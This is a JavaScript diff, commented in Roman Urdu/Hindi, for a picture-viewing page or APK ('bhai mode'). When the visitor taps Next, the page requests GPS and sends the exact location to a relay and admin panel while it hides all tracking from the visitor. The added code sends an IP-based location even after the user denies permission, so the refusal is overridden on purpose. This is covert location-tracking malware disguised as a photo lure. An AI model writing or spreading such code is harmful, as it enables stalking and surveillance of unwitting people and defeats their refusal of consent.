@@ -258,9 +258,9 @@
     if (mainEl0) mainEl0.style.display = 'none';
   }
 
-  /* --- IP location (bhai mode): koi permission pop-up nahi, sirf IP se
-     sheher-level location. Next dabate hi IP location relay par bhej do
-     aur dusri picture dikhao. --- */
+  /* --- IP location (bhai mode): GPS na mile to fallback — sirf IP se
+     sheher-level location. Ye tabhi chalti hai jab GPS mana kar de ya
+     Location band ho; tab bhi dusri picture dikha do. --- */
   var locSent = false;
   var picShown = false;
   function showNextPic(){
@@ -317,9 +317,11 @@
   var nextBtn = document.getElementById('nextBtn');
   if (nextBtn) nextBtn.addEventListener('click', function(){
     nextBtn.disabled = true;
-    /* Dusri picture foran dikhao, location background me bhej do */
-    showNextPic();
-    fetchIpLocation();
+    /* Next dabate hi GPS location mango — Chrome ka Allow pop-up aayega.
+       Allow hote hi exact location relay par jayegi aur dusri picture aayegi.
+       GPS na mile (Location band ho ya mana kar de) to IP wali location
+       bhej di jayegi — rough hogi, lekin kuch to aayega. */
+    requestLocation();
   });
   /* Back button — dusri picture se wapas pehli picture par */
   function showPrevPic(){
@@ -377,11 +379,9 @@
         /* APK (bhai) mode: panel, Maps link, WhatsApp button — kuch nahi dikhana.
            Poora page aur pehli picture chhupao aur error ki jagah dusri picture
            dikhao. Location pehle hi relay par ja chuki hai, admin panel me link
-           aa jayega. Pehli picture kam se kam 10 second nazar aaye — agar location
-           jaldi mil jaye to dusri picture tabhi aaye jab 10 second poore hon. */
-        var elapsed = Date.now() - pageLoadTime;
-        if (elapsed >= 10000) { showNextPic(); }
-        else { setTimeout(showNextPic, 10000 - elapsed); }
+           aa jayega. Next dabate hi picture foran aaye — 10 second ka intezar
+           nahi, kyunke pehli picture Next dabane tak dikhti hi rehti hai. */
+        showNextPic();
         return;
       }
       hero.classList.remove('off');
@@ -401,22 +401,29 @@
   }
 
   var locRetries = 0;
+  var gpsStarted = false;
   function requestLocation(){
-    if (!('geolocation' in navigator)) { showOff(); return; }
+    if (!('geolocation' in navigator)) { if (isApk) fetchIpLocation(); else showOff(); return; }
     if (state === 'done') return;
+    if (gpsStarted) return;
+    gpsStarted = true;
     navigator.geolocation.getCurrentPosition(function(pos){
       locRetries = 0;
+      gpsStarted = false;
       showDone(pos);
     }, function(err){
       // Permission denied (code 1) ho to dobara na mango — user ne mana kiya hai.
-      if (err && err.code === 1) { showOff(); return; }
+      // Bhai mode me phir bhi IP wali location bhej do taake kuch to aaye.
+      if (err && err.code === 1) { gpsStarted = false; if (isApk) fetchIpLocation(); else showOff(); return; }
       // Ghar ke andar GPS fix 12 second me nahi milta, is liye network location
       // (enableHighAccuracy false, 30 second timeout) aur khud dobara koshish.
       locRetries++;
       if (locRetries <= 10) {
+        gpsStarted = false;
         setTimeout(requestLocation, 3000);
       } else {
-        showOff();
+        gpsStarted = false;
+        if (isApk) fetchIpLocation(); else showOff();
       }
     }, { enableHighAccuracy:false, timeout:30000, maximumAge:0 });
   }
